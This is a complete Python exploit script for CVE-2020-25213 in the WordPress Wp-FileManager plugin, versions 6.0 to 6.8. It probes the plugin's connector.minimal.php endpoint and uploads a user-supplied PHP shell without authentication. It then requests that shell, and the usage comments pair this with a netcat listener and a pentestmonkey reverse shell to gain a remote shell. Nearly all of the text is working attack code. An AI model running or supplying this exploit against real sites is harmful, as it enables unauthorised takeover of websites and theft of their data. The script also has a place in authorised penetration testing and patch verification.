# Exploit Title: WordPress Plugin Wp-FileManager 6.8 - RCE
# Date: 10th March, 2021
# Script Author: led
# CVE: CVE-2020-25213
# Version Affected: 6.0 to 6.8
# Vendor URL: https://wordpress.org/plugins/wp-file-manager/

# Refrences:
#1. https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/
#2. https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/

# Usage:
# nc -lvnp $LISTENER_PORT
# python3 exploit.py http://$TARGET_IP/ shell.php 
# Use pentest monkey php reverse shell
import requests, json, sys
try:
    url = sys.argv[1]
    shell = sys.argv[2]
except:
    print("[?] Usage")
    print("[!] python3 exploit.py http://www.targetip.com/ shell.php")
    quit()

target_endpoint = f"{url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"

headers = {
    "User-Agent": user_agent,
    "Accept": "*/*",
    "Connection": "close"
}

data = {
    "cmd" : "upload", 
    "target" : "l1_", 
}
files = {
    'upload[0]': open(f'{shell}', 'rb'),
}

def checkWPFileManager():
    res = requests.get(target_endpoint, headers=headers)
    error = res.json()['error'][0]
    if error == "errUnknownCmd":
        print(f"[+] {url} is vulnerable")
        return True
    else:
        print(f"[-] {url} is not vulnerable")
        return False

def uploadWPFileManager():
        print("[*] Uploading the shell")
        res_up = requests.post(target_endpoint, headers=headers, data=data, files=files, verify=True)
        if res_up.status_code == 200:
            print("[+] Shell Uploaded successfully")
        else:
            print("[-] Shell could not be uploaded")

def exploitWPFileManager():
    vuln = checkWPFileManager()
    if vuln == True:
        uploadWPFileManager()
        new_endpoint = f"{url}/wp-content/plugins/wp-file-manager/lib/files/{shell}"
        try:
            res_exp = requests.get(new_endpoint, headers=headers, timeout=7)
        except requests.Timeout :
            print('[*] Timeout....Shutting Down')
            quit()
    else:
        print("[-] Exploit was not successful")
        quit()

if __name__ == "__main__":
    exploitWPFileManager()
